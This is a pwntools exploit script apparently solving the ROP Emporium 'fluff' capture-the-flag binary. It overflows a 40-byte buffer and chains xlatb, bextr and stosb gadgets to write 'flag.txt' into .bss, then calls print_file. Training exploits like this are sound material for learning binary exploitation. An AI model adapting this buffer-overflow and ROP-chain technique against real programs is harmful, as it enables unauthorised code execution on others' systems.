from pwn import *

context.binary = "./fluff"
context.terminal = ["tmux", "splitw", "-h"]
elf = ELF("./fluff")

print_file_plt = elf.plt["print_file"]
bss_section = 0x601A00  # writable .bss section

ret_gadget = 0x400295
pop_rdi_gadget = 0x4006A3

# sets AL to byte of mem @ [RBX + unsigned AL]
xlatb_gadget = 0x400628  # xlat   BYTE PTR ds:[rbx]
clear_al_gadget = 0x400610  # mov eax, 0 ; pop rbp ; ret

# store AL at address RDI
stosb_gadget = 0x400639  # stos   BYTE PTR es:[rdi],al

# we can combine these above gadgets to  write our string into memory byte by byte
# but now we need a way to edit the value of rbx

# copy bits from rcx into rbx, depends on rdx
# 7:0[RDX] => the start bit in rcx, 15:8[RDX] => the size
pop_rdx_rcx_bextr_gadget = (
    0x40062A  # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
)
# to copy the entirety of rcx into rbx we set rdx to 0x4000

# now we can 1. set the AL byte based on RBX 2. change RBX based on RDX/RCX 3. set one byte in memory at [RDI] from al

# flag.txt is in memory already, just in scattered bytes
flag_arr = [
    0x4003C4 - 0x3EF2,  # f
    0x4003E4 - 0x3EF2,  # l
    0x4003D6 - 0x3EF2,  # a
    0x4003CF - 0x3EF2,  # g
    0x400439 - 0x3EF2,  # .
    0x4003F1 - 0x3EF2,  # t
    0x4006C8 - 0x3EF2,  # x
    0x4003F1 - 0x3EF2,  # t
]

p = pwnlib.gdb.debug("./fluff")

payload = b"A" * 40  # fill buffer w/ junk

payload += p64(pop_rdi_gadget)
payload += p64(bss_section)  # rdi

payload += p64(pop_rdx_rcx_bextr_gadget)
payload += p64(0x4000)  # rdx
payload += p64(flag_arr[0])  # rcx 'f'
# now rbx holds the addr of f in mem

payload += p64(clear_al_gadget)  # only clear once!
payload += p64(ret_gadget)  # rbp

payload += p64(xlatb_gadget)  # set al to 'f'

payload += p64(stosb_gadget)  # store 'f' in bss section

chars = [0x66, 0x6C, 0x61, 0x67, 0x2E, 0x74, 0x78]

for i in range(1, 8):
    payload += p64(pop_rdx_rcx_bextr_gadget)
    payload += p64(0x4000)  # rdx
    payload += p64(flag_arr[i] - chars[i - 1])  # rcx

    payload += p64(xlatb_gadget)  # set al to char

    payload += p64(stosb_gadget)  # store char in bss section

payload += p64(pop_rdi_gadget)
payload += p64(bss_section)  # rdi


payload += p64(print_file_plt)

p.sendline(payload)
p.interactive()
